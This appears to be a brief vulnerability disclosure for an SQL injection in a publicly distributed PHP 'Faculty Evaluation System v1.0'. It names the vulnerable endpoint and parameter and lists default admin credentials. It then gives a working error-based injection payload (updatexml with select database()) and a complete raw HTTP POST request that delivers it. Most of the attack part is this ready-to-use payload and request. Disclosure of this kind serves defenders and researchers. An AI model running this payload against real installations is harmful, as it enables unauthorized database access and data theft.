# Faculty Evaluation System v1.0 by oretnom23 has SQL injection

Admin account password： admin@admin.com/admin123
 
BUG_Author: oV

vendors: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /eval/ajax.php?action=delete_subject

Vulnerability location: /eval/ajax.php?action=delete_subject, id

dbname =evaluation_db

[+] Payload: id=2 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /eval/ajax.php?action=delete_subject HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/eval/index.php?page=subject_list
Content-Length: 64
Cookie: PHPSESSID=lrrse02i69soj9l3lnarhnd9ck
Connection: close

id=2 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/233828036-e84eaf70-200d-4ccf-9d6f-fa68fca5b725.png)
